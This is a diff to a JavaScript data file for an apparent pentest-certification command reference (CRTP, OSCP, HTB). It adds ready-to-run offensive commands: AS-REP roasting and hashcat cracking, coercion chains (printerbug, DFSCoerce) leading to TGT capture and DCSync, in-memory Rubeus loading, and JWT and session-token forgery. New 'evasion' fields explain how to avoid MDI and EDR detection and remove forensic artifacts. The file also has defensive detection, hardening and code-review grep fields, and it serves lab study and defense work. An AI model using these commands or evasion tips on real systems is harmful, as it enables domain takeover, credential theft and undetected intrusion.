           "command": "curl -s http://<target>/api-docs | jq '.paths | keys[]'",
           "caption": "OpenAPI spec — alternative path for endpoint discovery",
-          "label": "Swagger/OpenAPI"
+          "label": "Swagger - /api-docs"
         },
         {
           "command": "ffuf -u http://<target>/api/FUZZ/<endpoint> -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H \"Authorization: Bearer <jwt_token>\" -mc 200,201,301",
@@ -2967,7 +3314,8 @@ const COMMAND_DATA = {
           "MITRE T1552",
           "MITRE T1552.001",
           "OWASP A02:2021"
-        ]
+        ],
+        "evasion": "Capture and analyze the connection offline; replay only the crafted request needed, not a broad probe."
       }
     },
     {
@@ -3050,7 +3398,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M24",
           "MITRE T1595"
-        ]
+        ],
+        "evasion": "Throttle and randomize the screenshot/probe sweep; use a normal User-Agent; scope to in-scope hosts to avoid a fan-out pattern."
       }
     },
     {
@@ -3248,7 +3597,17 @@ const COMMAND_DATA = {
         "misconfiguration": "Accounts created with 'Do not require Kerberos preauthentication' checked — often legacy service accounts or misconfigured automation accounts. No periodic audit for this attribute.",
         "vulnerable_config": "# Accounts vulnerable to AS-REP roasting:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth\n# Output: svc_legacy — DoesNotRequirePreAuth: True → VULNERABLE\n\n# Can be exploited without any credentials:\n# Rubeus.exe asreproast /user:svc_legacy /format:hashcat /outfile:asrep.txt\n# → $krb5asrep$23$svc_legacy@CORP.LOCAL:... (crack with hashcat -m 18200)",
         "secure_config": "# Audit and fix all pre-auth disabled accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {\n  Set-ADAccountControl $_ -DoesNotRequirePreAuth $false\n  Write-Output \"Fixed: $($_.SamAccountName)\"\n}\n\n# Scheduled task / quarterly audit:\n$vuln = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}\nif ($vuln) { Send-MailMessage -To 'security@corp.local' -Subject 'AS-REP Roastable Accounts Found' -Body ($vuln | Out-String) }\n\n# MDI: 'AS-REP roasting attack' alert enabled by default on MDI deployment"
-      }
+      },
+      "variations": [
+        {
+          "label": "Crack AS-REP hashes (John)",
+          "command": "john.exe --wordlist=<wordlist> <hashfile>"
+        },
+        {
+          "label": "Crack AS-REP (hashcat m18200)",
+          "command": "hashcat -m 18200 <hashfile> <wordlist>"
+        }
+      ]
     },
     {
       "id": "cdsa-m06-asreproasting",
@@ -3325,8 +3684,25 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash — without demanding proof of identity first.",
         "vulnerable_config": "# Active Directory user account attribute (via ADUC or ADSI Edit)\n# 'Do not require Kerberos preauthentication' = CHECKED\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true\n\n# UAC flag value: 0x400000 (4194304)\n# Confirmed with:\nGet-ADUser svc_backup -Properties DoesNotRequirePreAuth",
-        "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix — find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
-      }
+        "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix — find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)",
+        "evasion": "Forge/inject with AES keys (not RC4) and realistic lifetimes to match normal tickets; request tickets just before use; avoid extra SID history that trips MDI."
+      },
+      "variations": [
+        {
+          "label": "Specific user",
+          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Roast no-preauth users",
+          "command": ".\\Rubeus.exe asreproast /outfile:asrep.txt"
+        },
+        {
+          "label": "Crack",
+          "command": "hashcat -m 18200 asrep.txt rockyou.txt"
+        }
+      ]
     },
     {
       "type": "attack-chain",
@@ -3577,6 +3953,124 @@ const COMMAND_DATA = {
         "misconfiguration": "Windows systems accumulate privilege escalation paths over time: scheduled tasks running as SYSTEM with world-writable scripts, service binaries with weak DACL (non-admins can overwrite), AlwaysInstallElevated enabled (any MSI installs as SYSTEM), or SeImpersonatePrivilege granted to web/service accounts.",
         "vulnerable_config": "# AlwaysInstallElevated (any user installs MSI as SYSTEM):\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# Both = 1  ->  msfvenom -p windows/exec CMD=calc.exe -f msi > priv.msi; msiexec /quiet /i priv.msi\n\n# Service binary with weak DACL:\nicacls C:\\Program Files\\VulnSvc\\svc.exe\n# BUILTIN\\Users:(F)  <-- any user has Full Control -> replace with malicious binary",
         "secure_config": "# Disable AlwaysInstallElevated:\n# GPO: Computer Config > Admin Templates > Windows Components > Windows Installer\n#   'Always install with elevated privileges' = Disabled\n# Registry (both keys required):\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\n\n# Fix service binary DACLs:\nicacls 'C:\\Program Files\\VulnSvc\\svc.exe' /inheritance:r /grant:r 'NT AUTHORITY\\SYSTEM:(F)' 'BUILTIN\\Administrators:(F)'\n# Remove all non-admin write permissions\n\n# Audit with PowerUp or PrivescCheck:\n# Invoke-PrivescCheck -Thorough  # comprehensive privesc surface audit\n# Run monthly and after any software installation"
+      }
+    },
+    {
+      "id": "crtp-coercion",
+      "name": "Authentication Coercion (MS-RPRN / DFSCoerce / WSPCoerce)",
+      "command": "MS-RPRN.exe \\\\<target_dc_fqdn> \\\\<listener_host_fqdn>",
+      "description": "Force a target machine (often a DC) to authenticate to a host you control by triggering RPC methods over the Print System (MS-RPRN 'printerbug'), DFS Namespace (MS-DFSNM, DFSCoerce), or WSP (WSPCoerce) protocols. When the listener is an Unconstrained Delegation host running Rubeus monitor, you capture the coerced machine's TGT.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "loud",
+      "mitre": [
+        "T1187"
+      ],
+      "tools": [
+        "MS-RPRN.exe",
+        "DFSCoerce",
+        "WSPCoerce",
+        "Rubeus"
+      ],
+      "tags": [
+        "coercion",
+        "printerbug",
+        "dfscoerce",
+        "forced-authentication",
+        "unconstrained-delegation",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "DFSCoerce",
+          "command": "DFSCoerce-andrea.exe -t <target_dc> -l <listener_host>"
+        },
+        {
+          "label": "WSPCoerce (via Loader, in-memory)",
+          "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <TARGET_DC> <LISTENER_HOST>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "On the unconstrained-delegation host, start the TGT monitor",
+          "command": "C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap"
+        },
+        {
+          "label": "Coerce the DC to authenticate to it (printerbug)",
+          "command": "C:\\AD\\Tools\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.local"
+        },
+        {
+          "label": "Or DFSCoerce",
+          "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv"
+        },
+        {
+          "label": "Rubeus captures DCORP-DC$ TGT -> ptt and DCSync",
+          "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args ptt /ticket:<base64_tgt>"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Cross-forest coercion (moneycorp DC)",
+          "command": "C:\\AD\\Tools\\MS-RPRN.exe \\\\mcorp-dc.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.local"
+        },
+        {
+          "label": "DFSCoerce cross-forest",
+          "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local"
+        }
+      ],
+      "notes": "Coercion is the trigger half of the unconstrained-delegation attack: the listener must be a host with unconstrained delegation running Rubeus monitor (crtp-unconstrained-delegation). MS-RPRN needs the Print Spooler running on the target; if patched/disabled, fall back to DFSCoerce (MS-DFSNM) or WSPCoerce. A captured DC machine-account TGT enables DCSync / silver tickets. Also relevant to RBCD and ADCS ESC8 relay chains.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1187 - Forced Authentication",
+          "url": "https://attack.mitre.org/techniques/T1187/"
+        },
+        {
+          "title": "DFSCoerce (GitHub)",
+          "url": "https://github.com/Wh04m1001/DFSCoerce"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-unconstrained-delegation",
+          "note": "The listener must be an unconstrained-delegation host running Rubeus monitor",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-dcsync",
+          "note": "Use the captured DC$ TGT to DCSync",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-silver-ticket",
+          "note": "DC machine hash also enables silver tickets for its services",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "prerequisites": "A host with Unconstrained Delegation under attacker control running a TGT monitor; network reach to the target over the coercion protocol (RPC 445/135); a domain account to authenticate the RPC call.",
+        "why_it_works": "MS-RPRN (RpcRemoteFindFirstPrinterChangeNotificationEx), MS-DFSNM, and WSP expose RPC methods that make the server connect back to an attacker-supplied UNC/host, authenticating with its machine account. If the callback lands on an unconstrained-delegation host, the machine's full TGT is cached there and can be extracted.",
+        "misconfiguration": "Print Spooler running on DCs; unconstrained delegation configured on non-DC hosts; coercible RPC interfaces reachable; no SMB signing / no Extended Protection for Authentication.",
+        "impact": "Capture of a Domain Controller's machine-account TGT -> DCSync, silver tickets for the DC's services, and effectively domain compromise.",
+        "detection": "Inbound RPC to spoolss / MS-DFSNM from unusual hosts; a DC authenticating (Kerberos TGS/AS or NTLM) to a member server it never normally contacts; Event 4624/4769 for a DC machine account against a workstation; EDR alerts on printerbug/DFSCoerce signatures.",
+        "artifacts": "Spooler/DFS RPC connection logs; anomalous machine-account authentication to the listener; Rubeus monitor output on the listener host.",
+        "vulnerable_config": "# Print Spooler = Running on Domain Controllers\n# Unconstrained delegation on a non-DC (msDS-... / userAccountControl TRUSTED_FOR_DELEGATION)\n# SMB signing not required; EPA off",
+        "secure_config": "# Disable Print Spooler on DCs and servers that don't print\n# Remove unconstrained delegation; use constrained/RBCD or none\n# Require SMB signing and enable Extended Protection for Authentication\n# Add DCs to 'Protected Users' / mark accounts 'sensitive, cannot be delegated'",
+        "prevention": "Disable Print Spooler on DCs; eliminate unconstrained delegation; require SMB signing + EPA; mark privileged/computer accounts as non-delegable; monitor coercion RPC. [MITRE M1042, M1041, M1037]",
+        "evasion": "Choose whichever coercion protocol is unpatched (printerbug vs DFSCoerce vs WSPCoerce); trigger briefly to grab one TGT and stop the monitor to limit noise.",
+        "sources": [
+          "CRTP",
+          "MITRE T1187"
+        ]
       }
     },
     {
@@ -4416,7 +4910,7 @@ const COMMAND_DATA = {
         "privilege-escalation",
         "backdoor"
       ],
-      "category": "Persistence",
+      "category": "Exploitation",
       "subcategory": "Cloud - AWS",
       "certifications": [
         "OSCP"
@@ -5463,7 +5957,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.002",
           "MITRE T1078.002"
-        ]
+        ],
+        "evasion": "Copy the hives/ntds via the shadow copy, parse OFFLINE, and remove the shadow copy + copied files after."
       }
     },
     {
@@ -5567,7 +6062,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.003",
           "MITRE T1078.002"
-        ]
+        ],
+        "evasion": "Copy the hives/ntds via the shadow copy, parse OFFLINE, and remove the shadow copy + copied files after."
       }
     },
     {
@@ -5767,7 +6263,9 @@ const COMMAND_DATA = {
         "why_it_works": "Bashfuscator generates complex, multi-layer bash obfuscation from a simple command. Output uses array variable expansion, printf formatting, and eval — all valid bash syntax — to represent arbitrary commands without readable keywords. The -s 1 -t 1 flags minimize the obfuscation level; --layers controls depth. The result bypasses WAF signature rules that look for specific command keywords while remaining fully executable by bash.",
         "impact": "Automated generation of novel bypass payloads — each run of Bashfuscator produces a different obfuscated version of the same command. Defeats signature-based WAF rules that rely on pattern recognition. Used to bypass ModSecurity and commercial WAF rules.",
         "detection": "[MITRE T1059] Behavioral WAF: detect eval, printf, array expansion, W0= style variable patterns. Allowlist input validation eliminates the injection point entirely — obfuscation is irrelevant if the input never reaches a shell. Process audit: bash -c 'eval ...' subprocess spawned by web server.",
-        "artifacts": "Access log: long parameter values with W0=(...) array syntax, printf patterns, or eval wrappers. WAF log: complex obfuscated payload blocked by anomaly score."
+        "artifacts": "Access log: long parameter values with W0=(...) array syntax, printf patterns, or eval wrappers. WAF log: complex obfuscated payload blocked by anomaly score.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -6042,7 +6540,7 @@ const COMMAND_DATA = {
           "rel": "alternative"
         }
       ],
-      "notes": "Key BH queries: 'Shortest Paths to Domain Admins', 'Computers with Unconstrained Delegation', 'Find Principals with DCSync Rights'.",
+      "notes": "Key BH queries: 'Shortest Paths to Domain Admins', 'Computers with Unconstrained Delegation', 'Find Principals with DCSync Rights'. SOAPHound collects BloodHound-compatible data over AD Web Services (ADWS, TCP 9389) instead of raw LDAP - much stealthier than SharpHound. Build a cache first, then --bhdump.",
       "references": [
         {
           "title": "CRTP - BloodHound/SharpHound",
@@ -6064,7 +6562,17 @@ const COMMAND_DATA = {
         "misconfiguration": "NetSessionEnum not restricted — any user can enumerate sessions. RestrictRemoteSam not configured. Excessive ACLs (GenericAll/GenericWrite on DA accounts by non-admin groups). MDI not deployed.",
         "vulnerable_config": "# RestrictRemoteSam not set (any auth user can enumerate local accounts):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -EA SilentlyContinue).RestrictRemoteSam\n# Returns $null = NOT restricted = VULNERABLE\n\n# Dangerous ACE example:\nGet-ObjectAcl 'Domain Admins' | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}",
         "secure_config": "# Restrict SAMR enumeration:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RestrictRemoteSam -Value 'O:BAG:BAD:(A;;RC;;;BA)'\n\n# Via GPO:\n# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options\n# → Network access: Restrict clients allowed to make remote calls to SAM\n\n# Remediate dangerous ACEs:\nRemove-ADPermission -Identity 'DomainAdmin1' -User 'HelpDesk' -AccessRights GenericAll\n\n# WDAC: deny SharpHound.exe by hash"
-      }
+      },
+      "variations": [
+        {
+          "label": "SOAPHound - build cache (ADWS, stealthy)",
+          "command": "SOAPHound.exe --buildcache -c <cache_file>"
+        },
+        {
+          "label": "SOAPHound - dump BloodHound data",
+          "command": "SOAPHound.exe -c <cache_file> --bhdump -o <output_dir> --nolaps"
+        }
+      ]
     },
     {
       "id": "ad-neo4j-bloodhound",
@@ -6153,6 +6661,12 @@ const COMMAND_DATA = {
       "tools": [
         "BloodHound",
         "neo4j"
+      ],
+      "variations": [
+        {
+          "label": "Reset neo4j password on first run",
+          "command": "# browse http://localhost:7474  (neo4j/neo4j -> set new)"
+        }
       ]
     },
     {
@@ -6246,13 +6760,33 @@ const COMMAND_DATA = {
       },
       "tools": [
         "bloodhound-python"
+      ],
+      "variations": [
+        {
+          "label": "Kerberos auth (ccache)",
+          "command": "bloodhound-python -k -no-pass -ns <dc_ip> -d <domain> -c All --zip"
+        },
+        {
+          "label": "Target a specific collection method",
+          "command": "bloodhound-python -u '<user>' -p '<password>' -ns <dc_ip> -d <domain> -c DCOnly"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Collect from Linux (no Windows agent)",
+          "command": "bloodhound-python -u '<user>' -p '<password>' -ns <dc_ip> -d <domain> -c All --zip"
+        },
+        {
+          "label": "Import the zip into BloodHound and run pathfinding",
+          "command": "# upload zip -> 'Shortest paths to Domain Admins'"
+        }
       ]
     },
     {
       "id": "auth-2fa-brute",
       "name": "Broken Auth – 2FA / OTP Code Brute-Force",
       "type": "command",
-      "command": "ffuf -w <tokens.txt> -u http://<target>/2fa.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=<session>' -d 'otp=FUZZ' -fr 'Invalid 2FA Code'",
+      "command": "ffuf -w <wordlist> -u http://<target>/2fa.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=<session>' -d 'otp=FUZZ' -fr 'Invalid 2FA Code'",
       "description": "Brute-force a numeric one-time 2FA/OTP code when the app enforces no attempt limit on the verification endpoint, bypassing the second factor after a valid password.",
       "platform": "linux",
       "requires": [
@@ -6336,7 +6870,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication logic contains implementation flaws beyond missing rate limits: reset tokens are short/predictable/not expired, 2FA codes are not rate-limited, session IDs are not rotated on authentication, or parameter tampering changes the authenticated user. These are application logic bugs, not infrastructure issues.",
         "vulnerable_config": "# Password reset token — predictable + long-lived:\n# Token generated as: md5(email + time())  (predictable)\n# No expiry set: token valid indefinitely\n# Token not invalidated after use: can be reused\n\n# 2FA code not rate-limited:\n# POST /verify-2fa with 000000 to 999999 (1M combinations)\n# No lockout -> automated bruteforce in ~17 minutes at 1000 req/s\n\n# Direct object reference in auth check:\n# GET /dashboard?user_id=1001  -> change to user_id=1002 -> access another user",
-        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer"
+        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
       }
     },
     {
@@ -6416,7 +6951,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication logic contains implementation flaws beyond missing rate limits: reset tokens are short/predictable/not expired, 2FA codes are not rate-limited, session IDs are not rotated on authentication, or parameter tampering changes the authenticated user. These are application logic bugs, not infrastructure issues.",
         "vulnerable_config": "# Password reset token — predictable + long-lived:\n# Token generated as: md5(email + time())  (predictable)\n# No expiry set: token valid indefinitely\n# Token not invalidated after use: can be reused\n\n# 2FA code not rate-limited:\n# POST /verify-2fa with 000000 to 999999 (1M combinations)\n# No lockout -> automated bruteforce in ~17 minutes at 1000 req/s\n\n# Direct object reference in auth check:\n# GET /dashboard?user_id=1001  -> change to user_id=1002 -> access another user",
-        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer"
+        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
       }
     },
     {
@@ -6499,8 +7035,15 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication logic contains implementation flaws beyond missing rate limits: reset tokens are short/predictable/not expired, 2FA codes are not rate-limited, session IDs are not rotated on authentication, or parameter tampering changes the authenticated user. These are application logic bugs, not infrastructure issues.",
         "vulnerable_config": "# Password reset token — predictable + long-lived:\n# Token generated as: md5(email + time())  (predictable)\n# No expiry set: token valid indefinitely\n# Token not invalidated after use: can be reused\n\n# 2FA code not rate-limited:\n# POST /verify-2fa with 000000 to 999999 (1M combinations)\n# No lockout -> automated bruteforce in ~17 minutes at 1000 req/s\n\n# Direct object reference in auth check:\n# GET /dashboard?user_id=1001  -> change to user_id=1002 -> access another user",
-        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer"
-      }
+        "secure_config": "# Secure password reset tokens:\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits, cryptographically random\n# Store hash of token (not plaintext) in DB\n# Expiry: 15-30 minutes\n# Invalidate immediately on use\n# One token per user (invalidate old on new request)\n\n# 2FA rate limiting:\n# Max 5 attempts per code lifetime (30 seconds)\n# Lock account for 10 minutes after 5 failed 2FA attempts\n# Log all 2FA failures for SIEM alerting\n\n# Prevent IDOR in authorization:\n# NEVER trust client-supplied user_id for authorization decisions\n# Use session.user_id (server-side) for all resource access checks:\nif session['user_id'] != requested_user_id:\n    abort(403)  # forbidden\n# Implement RBAC (Role-Based Access Control) at the service layer",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
+      },
+      "variations": [
+        {
+          "label": "Tamper role/user in the body/cookie",
+          "command": "# change user_id / role=admin / isAdmin=true in request"
+        }
+      ]
     },
     {
       "id": "auth-default-creds",
@@ -6653,14 +7196,39 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Session tokens or JWT tokens are generated using predictable values (timestamp, username, sequential ID) or signed with a weak/known secret. An attacker who obtains one token (or who understands the generation algorithm) can forge tokens for other users, including administrators.",
         "vulnerable_config": "# Predictable session token (PHP):\n$token = md5($_POST['username'] . time());  // attacker knows username + approximate time\n\n# JWT with 'none' algorithm or weak secret:\n# Header: {\"alg\":\"HS256\"}  Secret: 'secret' or '' (empty)\n# Attacker changes alg to 'none' and removes signature:\n# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n\n# Sequential session IDs:\n# SESSIONID=1001 -> try 1000, 999 (IDOR on session)",
-        "secure_config": "# Cryptographically secure session token (PHP):\n$token = bin2hex(random_bytes(32));  // 256 bits of CSPRNG randomness\n\n# JWT — strong secret + explicit algorithm validation:\nimport jwt\n# Signing:\ntoken = jwt.encode({'user': user_id, 'exp': datetime.utcnow() + timedelta(hours=1)},\n                   SECRET_KEY, algorithm='HS256')\n# Validation — explicitly specify algorithm (blocks 'none' attack):\ntry:\n    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # list, not string!\nexcept jwt.InvalidTokenError:\n    abort(401)\n\n# Server-side session best practices:\n# HttpOnly + Secure + SameSite=Strict cookie flags\n# Rotate session ID on privilege change (login, role change)\n# Short expiry + idle timeout"
-      }
+        "secure_config": "# Cryptographically secure session token (PHP):\n$token = bin2hex(random_bytes(32));  // 256 bits of CSPRNG randomness\n\n# JWT — strong secret + explicit algorithm validation:\nimport jwt\n# Signing:\ntoken = jwt.encode({'user': user_id, 'exp': datetime.utcnow() + timedelta(hours=1)},\n                   SECRET_KEY, algorithm='HS256')\n# Validation — explicitly specify algorithm (blocks 'none' attack):\ntry:\n    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # list, not string!\nexcept jwt.InvalidTokenError:\n    abort(401)\n\n# Server-side session best practices:\n# HttpOnly + Secure + SameSite=Strict cookie flags\n# Rotate session ID on privilege change (login, role change)\n# Short expiry + idle timeout",
+        "code_review": "RED FLAGS (source): trust of client-supplied identity/role; weak tokens; no rate limit.\n  role/isAdmin read from request body/cookie  |  password compared with ==  |  predictable reset tokens (time/seq)  |  secrets hardcoded\nGREP:  grep -rniE \"isAdmin|role ?= ?(req|\\$_)|== ?password|md5\\(|reset_token|jwt\\.(sign|verify)\\(.*none\" .\nSAFE:  server-side session + role; rate limiting + lockout; constant-time compare; strong random tokens; verify JWT alg + signature."
+      },
+      "variations": [
+        {
+          "label": "Flip a base64/JSON role claim",
+          "command": "echo -n '{\"user\":\"x\",\"role\":\"admin\"}' | base64"
+        },
+        {
+          "label": "JWT alg:none",
+          "command": "# set header alg to none, strip signature, set admin claim"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Decode the session token",
+          "command": "echo '<token>' | base64 -d"
+        },
+        {
+          "label": "Modify the privilege field + re-encode",
+          "command": "echo -n 'user=<name>;role=admin' | base64"
+        },
+        {
+          "label": "Replay it",
+          "command": "curl -H 'Cookie: session=<forged>' <url>"
+        }
+      ]
     },
     {
       "id": "auth-password-bruteforce-ffuf",
       "name": "Broken Auth – Password Brute-Force + Custom Wordlist",
       "type": "command",
